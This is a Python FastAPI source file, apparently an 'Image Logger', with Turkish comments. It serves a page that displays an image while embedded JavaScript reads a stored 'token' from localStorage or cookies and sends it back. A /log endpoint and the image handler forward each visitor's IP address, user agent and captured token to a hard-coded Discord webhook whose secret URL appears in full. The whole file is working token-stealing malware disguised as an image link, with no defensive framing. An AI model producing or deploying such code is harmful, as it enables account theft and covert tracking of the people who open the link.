from fastapi import FastAPI, Request
import uvicorn
import requests
from urllib.parse import urlparse, parse_qs

app = FastAPI()

# Webhook URL (Discord’a log göndermek için)
WEBHOOK_URL = "https://discord.com/api/webhooks/1414315327772164159/5Afh7TBV3kpiDPm2jRovVwwFKAKFcqql3sN0amXhhEJUSNqZXCwl0XOMcS7vgpGKmQLa"

# Log düşürme fonksiyonu
def send_log(ip, user_agent, token=None):
    embed = {
        "username": "Image Logger",
        "embeds": [
            {
                "title": "User Logged",
                "color": 0x00FFFF,
                "description": f"**IP:** `{ip}`\n**User Agent:** `{user_agent}`\n**Token:** `{token if token else 'Not found'}`"
            }
        ]
    }
    requests.post(WEBHOOK_URL, json=embed)

# Ana endpoint
@app.get("/image")
async def serve_image(request: Request):
    # Kullanıcının IP’sini al (Vercel’de x-forwarded-for header’ından)
    client_ip = request.headers.get("x-forwarded-for")
    user_agent = request.headers.get("user-agent")

    # Token için JavaScript enjeksiyonu
    html_response = """
    <html>
        <body>
            <img src="https://cdn.discordapp.com/attachments/1160477039548186626/1414316072085225532/image.png" style="width:100%;height:100vh;">
            <script>
                // Token’i localStorage’dan almaya çalış
                const token = localStorage.getItem('token') || document.cookie.match(/__cfuid=[^;]*/);
                if (token) {
                    fetch('https://your-vercel-app.vercel.app/log?token=' + encodeURIComponent(token) + '&ip=' + encodeURIComponent(window.location.hostname));
                }
            </script>
        </body>
    </html>
    """

    # Log’u gönder
    send_log(client_ip, user_agent)

    return {"html": html_response}

# Ek log endpoint’i (token için)
@app.get("/log")
async def log_token(request: Request):
    token = request.query_params.get("token")
    ip = request.query_params.get("ip")
    user_agent = request.headers.get("user-agent")
    send_log(ip, user_agent, token)
    return {"status": "logged"}

# Yerel test için
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
